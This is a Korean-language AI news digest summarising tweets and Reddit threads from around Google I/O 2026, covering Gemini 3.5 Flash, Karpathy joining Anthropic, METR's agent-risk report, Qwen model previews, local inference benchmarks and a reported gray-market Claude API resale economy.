- 전 OpenAI 연구자들이 설립한 새 AI safety standards 조직 **Guidelight**는 첫 두 표준을 공개했다 ([sjgadler](https://x.com/sjgadler/status/2056762703033807068)).
- 여러 commentary thread는 frontier lab의 내부 에이전트 monitoring이 중요한 새 보안/control 분야가 되고 있다고 주장했지만, 증거는 아직 초기이고 서드파티 audit 역량은 제한적이라고 봤다 ([ChrisPainterYup](https://x.com/ChrisPainterYup/status/2056803418602426407), [neev_parikh](https://x.com/neev_parikh/status/2056801754122273093)).

### 산업 움직임과 인프라

- **Andrej Karpathy가 Anthropic에 합류**했다. 이는 피드에서 Google I/O 외 최대 이야기였다. Karpathy의 메모는 짧고 개인적이었다 ([karpathy](https://x.com/karpathy/status/2056753169888334312)); 이후 추측은 **RSI / autoresearch / pretraining** 역할에 집중됐다 ([scaling01](https://x.com/scaling01/status/2056773883982762114), [scaling01](https://x.com/scaling01/status/2056771657553920254)).
- **OpenAI**는 수요가 capacity-constrained 상태로 남는 가운데 고객에게 1–3년 약정 기반 장기 reserved compute access를 제공하는 **Guaranteed Capacity**를 출시했다 ([OpenAI](https://x.com/OpenAI/status/2056823271774101907), [sama](https://x.com/sama/status/2056827105401614656)).
- **Thinking Machines Lab**은 human-AI interactivity 연구에 **$100,000 + Tinker credits** grant를 발표했다 ([thinkymachines](https://x.com/thinkymachines/status/2056786920836145410)).
- **Heron Power**는 **12 MW** AI factory block용 **800V DC data center** blueprint를 공개하며, 기존 480 VAC build 대비 **MV-to-rack 전기 비용 1/3**, **설치 노동 1/10**, **grid-to-chip 비효율 절반**을 주장했다 ([baglino](https://x.com/baglino/status/2056805824685842872)).
- **John Carmack**은 “write really_big_buffer and it is all taken care of”에 적합한 OS/network primitive가 없다는 강한 인프라/시스템 비판을 올리며 TCP와 QUIC의 tradeoff를 비판했다 ([ID_AA_Carmack](https://x.com/ID_AA_Carmack/status/2056780156535279812)).

### Applied AI, 미디어, 제품 출시

- **fal**은 video-to-synced sound effects, audio inpainting, extension용 **Mirelo SFX 1.6**과 15초 녹화로 identity-consistent studio-quality avatar video를 만드는 **Avatar V**를 출시했다 ([fal](https://x.com/fal/status/2056769877021520039), [fal](https://x.com/fal/status/2056785566482456584)).
- **style transfer로서의 voice cloning**에 관한 thread는 인기 시스템이 음성을 더 따뜻하고 권위 있으며 더 “native English”처럼 들리게 만들고, 청취자가 원본 화자보다 clone을 더 신뢰한다고 주장했다 ([KaitlynZhou](https://x.com/KaitlynZhou/status/2056775499297513563)).
- pharma용 production AI에 관한 **Edison Scientific / Incyte** 주장은 주목할 만했지만 전부 vendor-reported였다. “단일 run에서 **1,500편 논문**을 읽고 **42,000줄 코드**를 작성”, **79% reproducibility**, full-pipeline deployment를 주장했다 ([kimmonismus](https://x.com/kimmonismus/status/2056760942378266763)).
- **Google**은 I/O에서 intelligent eyewear partnership, Google Pics, Stitch 업데이트, agentic commerce protocol 등 소비자용 비핵심 AI 제품도 발표했지만, Gemini/Antigravity 스택보다 기술적 실질성은 낮았다 ([Google](https://x.com/Google/status/2056805831237386360), [Google](https://x.com/Google/status/2056803288096690446), [Google](https://x.com/Google/status/2056803725214404634)).

### Google I/O 2026: Gemini 3.5 Flash, Omni, Google 에이전트 스택

- **Gemini 3.5 Flash 출시**: Google의 가장 큰 기술 출시는 **[Gemini 3.5 Flash](https://x.com/Google/status/2056788266872140232)**였다. Google은 이를 **에이전트와 코딩**을 위한 자사 최강 모델로 포지셔닝했다. Google은 이 모델이 **비슷한 frontier model보다 4배 빠르고** 종종 **비용은 절반 미만**이며, [Google](https://x.com/Google/status/2056788281317306466)과 [Google DeepMind](https://x.com/GoogleDeepMind/status/2056787990110994511)의 게시물 기준 **Terminal-Bench 2.1, GDPval-AA, MCP Atlas** 등 벤치마크에서 **Gemini 3.1 Pro**를 이긴다고 주장했다. 이 모델은 [Google](https://x.com/Google/status/2056791527314387208)에 따르면 **Gemini 앱, Search AI Mode, Gemini API, AI Studio, Antigravity, enterprise surface** 전반에 넓게 rollout 중이며, [Google DeepMind](https://x.com/GoogleDeepMind/status/2056794514564751490)에 따르면 **Gemini 3.5 Pro는 다음 달** 나온다.
- **독립 벤치마크는 더 미묘한 그림을 보여줌**: [Artificial Analysis](https://x.com/ArtificialAnlys/status/2056795055512596817)는 3.5 Flash가 현재 **speed–intelligence Pareto frontier**에 있으며, Intelligence Index **55점**, Gemini 3 Flash 대비 **9점 상승**, **agentic eval**과 **hallucination reduction**에서 주목할 만한 향상이 있었다고 밝혔다. 또한 **초당 출력 280토큰 초과**, **MMMU-Pro 84%**, 강한 **GDPval-AA Elo 1656**을 보고했다. 그러나 **입력/출력 100만 토큰당 $1.50 / $9**라는 큰 비용 증가가 동반된다. 이는 AA의 benchmark suite 실행 기준 Gemini 3 Flash보다 **5.5배 비싸고**, Gemini 3.1 Pro보다 **75% 비싸다**. [@arena](https://x.com/arena/status/2056793176720195693)의 커뮤니티 반응도 강한 **Code Arena: Frontend** 결과(#9 overall, Gemini 3 Flash 대비 +70점)를 강조했지만, 일부는 TerminalBench-Hard 같은 코딩 subset에서 기대보다 약한 성능을 지적했다.
- **Antigravity가 Google의 에이전트 플랫폼이 됨**: Google은 **[Antigravity](https://x.com/Google/status/2056789045548896516)**를 full agent-first stack으로 크게 확장했다. 여기에는 **CLI, SDK, desktop app 2.0, Android support, AI Studio export, enterprise integration**이 포함된다. headline demo는 Google이 autonomous agent team이 **작동하는 operating system을 처음부터** **12시간** 만에 만들었으며, **93개 병렬 sub-agent**, **15k+ model requests**, **2.6B tokens**, **API credits $1K 미만**을 사용했다고 밝힌 것이다 ([Google](https://x.com/Google/status/2056789235500466273)). Google은 또한 Gemini API에 **Managed Agents**를 도입해 Google 내부에서 쓰는 것과 같은 hosted Linux agent harness를 노출했다. 이는 **bash/python/node sandbox**, repo mounting, Markdown-defined skills를 지원하며 [Google AI Studio](https://x.com/GoogleAIStudio/status/2056836824686059616)와 [@_philschmid](https://x.com/_philschmid/status/2056836567470362955)가 언급했다.
- **Search와 소비자 표면이 agentic해짐**: Google은 웹을 장기간 monitoring하고 synthesized update를 보내는 **Search information agents**를 예고했다 ([Google](https://x.com/Google/status/2056794282502054066)). 또한 Antigravity와 Gemini 3.5 Flash를 사용해 맞춤형 시각 도구와 시뮬레이션을 즉석에서 동적으로 만드는 **Search generative UI**도 공개했다 ([Google](https://x.com/Google/status/2056795269694423065)). 회사는 또한 전용 cloud VM에서 장기 작업을 백그라운드로 실행하고 Google 도구와 통합되는 **24/7 personal agent**인 **Gemini Spark**를 소개했으며, MCP 지원도 계획되어 있다 ([Google](https://x.com/Google/status/2056791134295273554)).

### Gemini Omni, Flow, World Models

- **Gemini Omni**: Google DeepMind는 **[Gemini Omni](https://x.com/GoogleDeepMind/status/2056786446636212467)**를 “어떤 입력에서든 무엇이든 만들 수 있는 모델”로 출시했으며, 시작점은 **비디오**다. 핵심 pitch는 **Gemini의 reasoning과 world knowledge**를 Google의 생성형 미디어 스택과 결합해 멀티모달 편집과 생성을 수행한다는 것이다. Google은 Omni가 **텍스트, 이미지, 오디오, 비디오 입력**을 받아 **캐릭터 일관성, physics, scene memory**를 턴 전반에 유지하면서 고품질 비디오를 생성할 수 있다고 밝혔다 ([Google](https://x.com/Google/status/2056786888930062369), [Google](https://x.com/Google/status/2056786781992071172)). **Gemini Omni Flash**는 오늘 유료 Gemini 사용자와 **Flow**, **YouTube Shorts**에 rollout되며, API access는 몇 주 내 제공된다 ([Google](https://x.com/Google/status/2056789307856462061)).
- **Flow의 agentic editing**: Google은 Omni와 함께 **[Flow](https://x.com/Google/status/2056804333162008881)** 업데이트를 공개하며 **Google Flow Agent**, **Flow Tools**, **Gemini Omni Flash** 지원을 추가했다. 새 workflow는 단일 prompt를 넘어 **여러 action을 병렬로 수행**하고 **large-scale contextual edits**를 실행할 수 있는 creative-agent 모델로 이동한다 ([Google](https://x.com/Google/status/2056804688889348450)). [Flow 계정](https://x.com/FlowbyGoogle/status/2056804643204899276)은 이를 “비디오용 Nano Banana”라고 설명했다.
- **Street View 기반 Project Genie**: 주목할 world-model 업데이트는 Google이 **[Project Genie](https://x.com/Google/status/2056850758029464009)**를 거의 **20년치 Street View data**에 연결해 실제 위치에서 만든 interactive, navigable environment를 가능하게 한 것이다. 접근 권한은 전 세계 **Google AI Ultra** 구독자에게 확대되며, [@bilawalsidhu](https://x.com/bilawalsidhu/status/2056804315721843024) 같은 사용자는 이를 Google이 고유한 real-world data moat를 활용하는 강한 사례로 강조했다.

### 인재, 연구소, 생태계 움직임

- **Karpathy가 Anthropic에 합류**: 이날 가장 많이 engagement를 얻은 AI tweet은 [Andrej Karpathy의 발표](https://x.com/karpathy/status/2056753169888334312)였다. 그는 “R&D로 돌아가기 위해” **Anthropic에 합류**했다고 밝혔다. 이 tweet이 논의를 지배했고, 이후 [@scaling01](https://x.com/scaling01/status/2056773883982762114)는 Axios를 인용해 그가 **RSI/autoresearch**와 새로운 pretraining-focused effort를 맡을 것이라는 추측을 전했다. 세부 사항은 Anthropic이 확인하지 않았지만, 이 이동은 Anthropic의 큰 인재 영입으로 널리 해석됐다.
- **OpenAI capacity products**: OpenAI는 고객이 핵심 workload용 **장기 compute access**를 확보할 수 있는 상업 제품 **[Guaranteed Capacity](https://x.com/OpenAI/status/2056823271774101907)**를 발표했다. [Sam Altman](https://x.com/sama/status/2056827105401614656)은 모델이 더 유용해질수록 세계가 계속 **capacity constrained** 상태일 것이라며, **1–3년 약정에 discounted tokens**를 제공한다고 설명했다.
- **GitHub와 코딩 toolchain 통합**: [GitHub](https://x.com/github/status/2056801675042779279)는 **Gemini 3.5 Flash**가 **Copilot**에 rollout 중이라고 밝혔고, 반복적 agentic coding에 강한 tool use, 빠른 응답 시간, cache efficiency를 언급했다. [Cursor](https://x.com/cursor_ai/status/2056803731367456993)는 **Jira** 통합을 출시해 cloud agent가 work item을 가져와 merge-ready PR을 만들 수 있게 했다. [Code/VS Code](https://x.com/code/status/2056803208559759447)도 Gemini 3.5 Flash 제공을 발표했다.

### 학습 알고리즘, 벤치마크, 에이전트 평가

- **RL/post-training 논의가 더 조밀한 credit assignment로 이동**: [@nrehiew_](https://x.com/nrehiew_/status/2056751826356297834)는 다음 scalable training breakthrough가 **GRPO**를 기반으로 하되 **더 조밀하고 lower-bias credit assignment**를 사용할 수 있다고 주장하며 **ECHO**, **Composer2**, self-distillation, OPD 같은 방향을 언급했다. [@lateinteraction](https://x.com/lateinteraction/status/2056770702175318095)는 “pedagogical RL” framing으로 반박하며, **correct and easy-to-follow** rollout을 sampling하는 self-teacher를 훈련하자고 했다.
- **코딩 에이전트가 연구를 할 수 있는가? 아직은 아니다**: [Intology AI](https://x.com/IntologyAI/status/2056764236668493868)는 NanoGPT Speedrun competition 기반 autonomous benchmark인 **NanoGPT-Bench**를 공개했다. 이는 코딩 에이전트가 실제 AI R&D 진전에 기여할 수 있는지 테스트한다. 핵심 결과는 **Codex, Claude Code, Autoresearch가 인간 진전의 9.3%만 회복**하며, 대부분 algorithmic innovation이 아니라 hyperparameter tuning 때문이라는 것이다.
- **Agent harness와 memory가 더 formalized되고 있음**: [@omarsar0](https://x.com/omarsar0/status/2056764334181884158)는 **code-as-agent-harness**에 관한 100쪽 이상 survey를 강조하며, 미래 시스템은 **executable, inspectable, stateful, governed**해야 한다고 주장했다. [François Chollet](https://x.com/fchollet/status/2056777649880752160)는 실제 task가 거의 Markovian이 아니므로 high-fidelity trajectory compression이 없는 agent는 유용성이 크게 떨어진다는 관련 지점을 제기했다.
- **Verifier 품질이 병목으로 부상**: [@Shahules786](https://x.com/Shahules786/status/2056773476585816255)의 thread는 agent benchmark scaling이 이제 task 추가보다 **verifier quality 개선**에 더 달려 있다고 강조하며 **SWE-bench Verified**, **OSWorld-Verified**, **ComputerRL**, **BenchGuard**를 인용했다.

### 과학, 생물학 모델, 도메인 특화 시스템

- **Hugging Face가 Carbon DNA 모델 공개**: 가장 기술적으로 흥미로운 open release 중 하나는 생성형 DNA foundation model 제품군 **[Carbon](https://x.com/lvwerra/status/2056774820872831234)**이었다. 팀은 **Carbon-3B가 Evo2-7B와 맞먹으면서 inference에서 250–275배 빠르다**고 밝혔다. 이는 단일 GPU에서 전체 인간 genome을 이틀 안에 처리할 수 있는 수준이다. 핵심 recipe 변화는 **deterministic 6-mer tokenization**, 학습 후반 plain cross-entropy를 대체하는 **factorized loss (FNS)**, 그리고 [@LoubnaBenAllal1](https://x.com/LoubnaBenAllal1/status/2056771927570530475)가 설명한 functional DNA + mRNA data의 curated staged mixture다. release에는 **models, training code, evals, data, demo**가 포함된다.
- **Google이 AI for science를 제품 category로 밀고 있음**: Google은 연구자를 위한 prototype suite인 **[Gemini for Science](https://x.com/GoogleDeepMind/status/2056808869242826957)**를 소개했다. 여기에는 **Literature Insights**(NotebookLM 기반 paper synthesis), **Hypothesis Generation**(Co-Scientist 스타일 multi-agent “idea tournament”), **Computational Discovery**(AlphaEvolve와 ERA로 구축해 수천 개 code variant를 병렬 생성·채점)가 포함된다. Google Research는 **ERA**가 이제 **Nature**에 게재됐다고도 밝혔다 ([Google Research](https://x.com/GoogleResearch/status/2056797037426045105)).
- **Specialized pretraining 지지가 늘어남**: [@pratyushmaini](https://x.com/pratyushmaini/status/2056780651219804582)는 **early exposure / specialized pretraining**이 forgetting에 대한 robustness를 개선한다는 증거를 언급하며, domain use case에 진지한 enterprise는 post-training만이 아니라 **custom model을 from scratch로 학습**하는 것을 고려해야 한다고 주장했다.

### 내부 에이전트 안전, 거버넌스, 모니터링

- **METR의 첫 Frontier Risk Report**: [METR](https://x.com/METR_Evals/status/2056800023149760666)은 **Anthropic, Google, Meta, OpenAI** 전반에 걸친 이례적으로 깊은 접근을 바탕으로 대형 새 report를 발표했다. 여기에는 model CoT와 capabilities, alignment, control에 관한 비공개 정보가 포함된다. 이 report는 lab이 **자체 내부 배포 에이전트를 통제하지 못할 수 있는지**에 초점을 맞추며, 광범위한 appendices와 transcripts를 포함한다 ([METR](https://x.com/METR_Evals/status/2056800047258649049)).
- **내부 에이전트 monitoring은 이제 active practice**: [@idavidrein](https://x.com/idavidrein/status/2056800422422265897)는 Anthropic에 한 달간 embedded되어 내부 AI agent가 “go rogue”할 수 있는지를 탐지하는 시스템을 stress-test했다고 설명했다. 그가 언급한 핵심 caveat는 이 exercise가 Anthropic에게 민감한 정보 redaction 재량을 허용했기 때문에 **formal audit이 아니라 exercise**라는 점이다.
- **새 safety standards 조직**: [Steven Adler](https://x.com/sjgadler/status/2056762703033807068)는 Page Hedley와 공동 설립한 새 AI safety standards organization **Guidelight**를 발표하고 첫 두 표준을 공개했다. dataset의 tweet thread는 부분적이지만, 이는 이 분야가 model eval만이 아니라 operational standard를 중심으로 전문화되고 있다는 또 다른 신호다.

### Top tweets (engagement 기준)

- **Karpathy joins Anthropic**: [@karpathy](https://x.com/karpathy/status/2056753169888334312)
- **Google introduces the Gemini 3.5 model series**: [@Google](https://x.com/Google/status/2056788000546386273)
- **Google DeepMind launches Gemini Omni**: [@GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056786446636212467)
- **Gemini 3.5 Flash GA for agents and coding**: [@Google](https://x.com/Google/status/2056788266872140232)
- **OpenAI Guaranteed Capacity**: [@OpenAI](https://x.com/OpenAI/status/2056823271774101907)
- **Google’s 24/7 personal agent, Gemini Spark**: [@Google](https://x.com/Google/status/2056791134295273554)

---

## AI Reddit Recap

### /r/LocalLlama + /r/localLLM Recap

### Qwen/ByteDance 모델 출시와 로컬 추론

- **[Qwen cant wait to release 3.7 models](https://www.reddit.com/r/LocalLLaMA/comments/1tgrpqc/qwen_cant_wait_to_release_37_models/)** (Activity: 1655): 이미지는 **Alibaba Qwen** 게시물 screenshot으로, Arena의 **Qwen3.7 Preview**, 특히 `Qwen3.7-Max-Preview`와 `Qwen3.7-Plus-Preview`를 발표하며 **Text #6**, **Vision #5** 순위를 주장한다. 게시물은 Qwen3.7 series가 곧 출시될 것임을 암시한다. Reddit 제목은 임박한 공개 model release에 대한 기대를 반영하며, 댓글러들은 **Qwen 3.7 Coder `122B A10B`**, `35B-A3B`, `27B` 같은 variant를 기대했다. [Image](https://i.redd.it/os2dyrbn9x1h1.jpeg) 댓글은 주로 원하는 model size와 specialization, 특히 coder 및 중간 크기 MoE/dense variant에 대한 추측이었다. Arena placement와 기존 `Qwen3.6:35b-a3b` 칭찬 외에 깊은 benchmark 논의는 없었다.
- 여러 댓글러는 local inference용 **Qwen 3.7 size/compute target**, 특히 RTX `3090`급 하드웨어에 실용적으로 맞는 `27B`에 집중했다. 한 사용자는 *“hallucinates less”*인 `27B` variant를 원한다고 했는데, 이는 현재 Qwen 중간 크기 모델이 local에서 이미 쓸 만하지만 reliability가 핵심 병목이라는 뜻이다.
- **Qwen 3.7 Coder 122B A10B**가 **NVFP4**로 native training된다는 가설에 대한 관심도 있었다. 이는 저정밀 NVIDIA inference에 최적화된 대형 sparse/MoE 스타일 coding model에 대한 수요를 보여준다. 또 다른 댓글러는 **Qwen3.6:35B-A3B**가 이미 “amazing”하다고 하며, dense-only scaling보다 active-parameter-efficient architecture에 기대를 걸었다.
- **[bytedance released an open source model that attempts to do just about anything with only 3b parameters](https://www.reddit.com/r/LocalLLaMA/comments/1thkwgk/bytedance_released_an_open_source_model_that/)** (Activity: 586): **ByteDance Research**는 **image/video understanding, generation, editing**을 위한 native unified multimodal model [**Lance**](https://huggingface.co/bytedance-research/Lance)를 공개했다. 이는 `3B active parameters`와 `128×A100` budget의 staged multi-task recipe로 scratch 학습됐다고 홍보된다. 한 댓글러는 Hugging Face card가 inference에 **≥40GB VRAM**을 요구하고 safetensors가 `Lance_3B`는 `24.7GB`, `Lance_3B_Video`는 `28.4GB`이므로 “3B”가 total이 아니라 **active**를 의미하는 것 같다고 지적했다. 댓글러들은 `3B` active parameter 모델이 이미지 생성/편집/비디오 생성을 시도한다는 점에 감탄했지만, 복잡한 scene에서 품질이 어떨지와 실제 total parameter count가 무엇인지에 의문을 제기했다.
- 이 release는 단순한 3B dense model이 아니라 **3B active parameters**로 보인다. 댓글러들은 model card가 inference에 `≥40GB VRAM`을 요구하고, 공개 safetensors가 `Lance_3B` 약 `24.7GB`, `Lance_3B_Video` 약 `28.4GB`라고 지적했다. 이는 “3B”가 시사하는 것보다 훨씬 많은 resident weight를 의미한다.
- 한 기술적 breakdown은 이를 custom-tuned **WAN 2.2 3B Video** 모델, **3B pixel-space image model**, VLM backbone으로 **Qwen2.5-VL 3B**를 결합한 **BAGEL 스타일 composite architecture**로 설명했다. `40GB VRAM` 요구사항은 모든 submodel을 resident로 유지할 때 주로 적용될 수 있으며, component를 필요할 때 loading/unloading하면 latency 대가로 memory footprint를 줄일 수 있다.
- 한 댓글러는 제공된 demo가 모델 능력을 충분히 보여주지 못한다고 비판했다. Gradio UI가 composite system의 장점으로 암시되는 VLM chat, text-to-image, agent-style interaction 없이 기본 **text-to-video**와 **VQA**만 지원한다는 것이다.
- **[Qwen 3.6 27B on 24GB VRAM setup: backend comparisons, quant choice and settings (llama.cpp, ik_llama.cpp, BeeLlama, vllm)](https://www.reddit.com/r/LocalLLaMA/comments/1tgis7s/qwen_36_27b_on_24gb_vram_setup_backend/)** (Activity: 434): 이 글은 단일 **RTX 3090 24GB**에서 **Qwen3.6-27B**를 benchmark했다. 최적 daily setup으로는 [`ik_llemma.cpp`](https://github.com/ikawrakow/ik_llama.cpp)와 [`Qwen3.6-27B-MTP-IQ4_KS.gguf`](https://huggingface.co/ubergarm/Qwen3.6-27B-GGUF/blob/main/Qwen3.6-27B-MTP-IQ4_KS.gguf), `156k` context, `q8_0/q8_0` KV, flash attention, built-in MTP(`--draft-max 4`), CPU-offloaded vision projector, checkpointed context를 제시했다. `~5.9k` prompt + `1024` output에서 `1260.95 tok/s` prefill과 `72.93 tok/s` decode를 보고했다. 비교 run에서는 upstream `llama.cpp`와 `UD-Q4_K_XL`이 `32k` context에서 `51.20–56.66 tok/s` decode, `beellama.cpp`와 `Q5_K_S` + DFlash `Q4_K_M` + TurboQuant KV는 `122.8k` context에서 `36.32 tok/s`였다. 저자는 single-card long-context OOM 불안정이 해결되지 않아 약 `78 tok/s` response speed를 보았음에도 `vLLM`/[`club-3090`](https://github.com/noonghunna/club-3090)을 제외했다. Quant 선택은 `IQ4_KS` 중심이며, 저자는 이것이 Unsloth `UD-Q4_K_XL`보다 약 `2.8 GiB`를 절약해 long context와 `q8_0` KV에 더 잘 맞는다고 했다. 관련 논의로 [`ik_llama.cpp` #1663](https://github.com/ikawrakow/ik_llama.cpp/discussions/1663) 및 [`IQ*_K` quant family thread](https://github.com/ikawrakow/ik_llama.cpp/discussions/8)가 인용됐다. BeeLlama maintainer는 target quant, KV quant/type, context length, batch setting이 달라 apples-to-apples가 아니라고 반박했다. **ubergarm**은 quant publisher로서 이것이 자신의 3090 Ti daily-driver setup에 가깝다고 확인했고, MTP 중 명시적 CPU thread control을 위한 [`ik_llama.cpp` PR](https://github.com/ikawrakow/ik_llama.cpp/pull/1797#issuecomment-4442151972)을 언급했으며, [oobabooga KLD quality testing](https://localbench.substack.com/p/qwen-3-6-27b-gguf-quality-benchmark)이 `iq4_ks`/`iq5_ks`를 quality-per-memory 선택지로 지지한다고 밝혔다.
- **BeeLlama 저자**는 benchmark methodology가 confounded됐다고 주장했다. 비교는 동일한 target model, quantization, KV-cache type/size, context length, prefill parameter(`-b`/`-ub`)를 사용해야 한다는 것이다. 특히 `IQ4_XS`, `UD_Q4`, `Q5`는 speed/quality가 크게 다를 수 있고, **TurboQuant KV cache는 `Q8`/`Q4` 대비 memory saving을 위해 performance를 희생**한다고 지적했다.
- `24GB` VRAM에서 Qwen 3.6 27B를 실행하는 한 사용자는 매우 긴 context를 위한 실용적 설정을 강조했다. GPU memory가 빡빡할 때 vision component만 CPU로 offload하면 `150k+` context가 가능하다는 것이다. 이 사용자는 **AMD 7900 XTX**에서 **Vulkan**으로 비슷한 setup을 테스트할 계획이며, vision inference는 드물게 쓰므로 느려도 받아들일 수 있다고 했다.
- **ubergarm/VoidAlchemy**는 설명된 `3090 Ti 24GB` setup이 자신의 daily driver와 가깝다고 확인하고, MTP 중 CPU thread 수를 control하는 `ik_llama.cpp` PR을 링크했다: [PR #1797 comment](https://github.com/ikawrakow/ik_llama.cpp/pull/1797#issuecomment-4442151972). 또한 **oobabooga의 KLD 기반 GGUF quality benchmark**가 Qwen 3.6 27B에서 `iq4_ks`와 `iq5_ks`를 강한 quality/memory-footprint 선택지로 보여준다고 인용했다: [localbench.substack.com](https://localbench.substack.com/p/qwen-3-6-27b-gguf-quality-benchmark). 그는 `iq4_ks`의 `q8_0` MTP tensor가 `32GB` 같은 더 큰 VRAM setup에서 재사용될 가능성도 언급했다.

### AI 남용 시장과 안전 벤치마크

- **[I spent a week researching the Chinese "transfer station" economy reselling Claude at 10% of retail. The supply chain is wilder than I expected.](https://www.reddit.com/r/LocalLLM/comments/1thfq8j/i_spent_a_week_researching_the_chinese_transfer/)** (Activity: 713): 이미지는 기술 diagram이 아니라 tweet/article-preview screenshot이다. 중국의 “transfer station” 경제가 **Claude/Anthropic API access**를 큰 폭으로 할인해 resell한다는 보고를 시각화하며, “token smuggle / inference exfiltration” 라벨이 붙은 stylized China map과 중국 AI 기업 및 Anthropic US-west region 간 link가 표시돼 있다 ([image](https://i.redd.it/5hol2ffys12h1.png)). 기술적 핵심은 주장된 relay supply chain이다. 여기에는 farmed Anthropic accounts, SMS/SIM-bank verification, fake IDs/deepfakes/HITL farms를 통한 KYC bypass, open-source relay project의 OAuth token pooling, “Opus” 요청이 cheaper model로 조용히 routing되는 model substitution이 포함된다. 인용된 CISPA audit은 최대 **`47.21%` performance drop**과 **`45.83%`** endpoint model-fingerprint failure를 주장했다. 댓글러들은 조사 결과가 credible하고 놀랍지 않다고 봤으며, 특히 model-substitution finding에 주목했다. 한 사용자는 CISPA 결과가 Anthropic/internal telemetry인지 external honeypot-style audit setup인지 물었다. 또 다른 댓글러는 cheap relay pricing이 subsidized inference economics의 일시적 산물이며, AI 회사들이 비보조 token cost를 맞닥뜨리면 사라질 가능성이 높다고 봤다.
- 한 댓글러는 글에서 인용된 **CISPA Helmholtz audit**을 강조했다. `17`개 relay endpoint가 official Anthropic API 대비 최대 `47.21%` 성능 저하와 `45.83%` model-fingerprint verification 실패를 보였다는 것이다. 기술적 우려는 “Claude Opus” 요청이 **Claude Haiku**, **GLM**, **Qwen** 같은 cheaper model로 조용히 routing된 뒤 Opus로 relabel될 수 있다는 점이며, 이는 benchmark validity와 model-authentication method에 의문을 제기한다.
- 한 thread는 relay-audit claim의 provenance를 물었다. 결과가 **Anthropic**, 내부 조사, 미국 기반 server instrumentation, 또는 gray-market supply chain 내부의 honeypot/fake-customer setup에서 나왔는지의 문제다. 핵심 기술 이슈는 model substitution이 어떻게 감지됐고, fingerprinting이 behavioral probe, API metadata leakage, latency/token-output signature, controlled endpoint testing 중 무엇으로 수행됐는가다.
- 한 댓글러는 의심되는 business model을 automated fake-account creation, 여러 사용자의 pooled account access, 모든 prompt/conversation을 resale operator database에 centralized logging하는 방식으로 요약했다. 기술/데이터 보안 implication은 relay API 사용자가 prompt, completion, credential, proprietary context를 resell, training, 기타 exploitation 가능한 untrusted intermediary에 노출할 수 있다는 점이다.
- **[I tested 42 LLMs on their willingness to build the apocalypse. The "safest" closed-source models are lying to you.](https://www.reddit.com/r/LocalLLaMA/comments/1tgm0k9/i_tested_42_llms_on_their_willingness_to_build/)** (Activity: 588): 이미지는 meme이 아니라 기술 bar chart다. open-source [DystopiaBench](https://github.com/anghelmatei/DystopiaBench)의 **Average Dystopian Compliance Score (DCS)**로 `42`개 LLM을 순위화했다. 낮은 점수는 여섯 가지 dystopia category의 escalating dual-use/harmful governance request에 덜 따르는 것을 의미한다. chart([image](https://i.redd.it/8hug0ul58w1h1.png))는 Haiku/Opus/Sonnet variant 같은 **Anthropic models**가 `20`대 중반 low end에 모여 있고, **Mistral Medium 3.5**가 `82` 근처의 극단적 high outlier이며, 여러 closed-source model이 safety branding에도 중간~높은 range에 있음을 보여준다. 댓글은 주로 vendor 간 대비에 집중했다. Anthropic의 낮은 score는 safety-focused mission과 맞고, Mistral의 높은 score는 *“release their doomsday model while they still could.”* 같은 농담 대상이 됐다.
- 한 댓글러는 **Anthropic**이 benchmark low end에 있는 것이 stated safety/alignment mission과 일치하므로 noise보다 meaningful signal일 수 있다고 했다. 또 다른 댓글러는 methodology concern을 제기했다. benchmark가 낮은 “willingness”를 더 좋다고 가정하지만, refusal, deception, over-filtering 중 무엇을 측정하느냐에 따라 그 framing 자체가 논쟁적이라는 것이다.

### 소형 모델 코딩 에이전트 신뢰성

- **[I built a coding agent that gets 87% on benchmarks with a 4B parameter model, here's how](https://www.reddit.com/r/LocalLLaMA/comments/1tgecrq/i_built_a_coding_agent_that_gets_87_on_benchmarks/)** (Activity: 1457): 이 글은 작은 모델을 harness-level technique으로 신뢰 가능하게 만들려는 local-first terminal coding agent **SmallCode**를 발표했다. technique에는 compound tools, automatic compile/lint repair loops, failure decomposition, token budgeting, optional cloud escalation, code symbol graph가 포함된다. 주장된 결과는 `huihui-gemma-4-e4b-it-abliterated` / Gemma 4 스타일 `4B` active parameters를 사용해 self-selected benchmark task `87/100`을 통과했다는 것이다. 그러나 댓글러들은 benchmark/model comparison이 재현 가능하지 않다고 지적했다. 포함된 [image](https://i.redd.it/ibtta0vvcu1h1.png)는 benchmark screenshot이 아니라 `SmallCode v0.1.0` Windows terminal UI가 context `graph /`로 idle/ready 상태임을 보여준다. 댓글은 headline claim에 회의적이었고, *which model, which benchmark*를 물었다. standard benchmark가 self-selected task의 `87%`보다 설득력 있을 것이라는 지적도 있었다. 한 댓글러는 이것이 또 하나의 standalone coding agent가 아니라 OpenCode/Pi 같은 기존 agent에 통합돼야 하는지 질문했고, README/model list가 AI-generated이거나 stale일 수 있다고 했다.
- 여러 댓글러는 **“87%”** 결과가 reproducible benchmark가 아니라 self-selected task 기반으로 보인다고 challenge했다. 특히 *“OpenCode scores ~75% with 14B models”* 같은 claim 뒤의 정확한 model/benchmark detail을 요청했고, standard benchmark와 reproducible setup 정보 없이는 비교가 기술적으로 의미 없다고 했다.
- 상세한 critique는 repo의 benchmark가 `bench/stress_test`를 가리킨다면 invalid할 수 있다고 주장했다. 해당 benchmark가 task success를 검증하지 않고 agent가 `20` characters output을 생성했는지만 확인한다는 것이다. 같은 댓글러는 **“4B active parameters”**가 true **4B-parameter model**과 같지 않기 때문에 headline이 misleading할 수 있다고 했다.
- 한 댓글러는 모델 간 tool-call composition 구현 우려를 제기했다. 일부 모델은 여러 tool call을 chain하도록 잘 훈련되지 않아 extra round trip이 생기며, **DeepSeek** 같은 모델은 큰 batched tool call에 이미 최적화돼 있어서 강제로 call을 compose하면 오히려 token-efficient가 떨어질 수 있다는 것이다. 또한 제안된 error decomposition이 더 큰 모델에 의존하지 않고 generic coding problem에서 수정이 필요한 정확한 line을 안정적으로 식별할 수 있는지 의문을 제기했다.
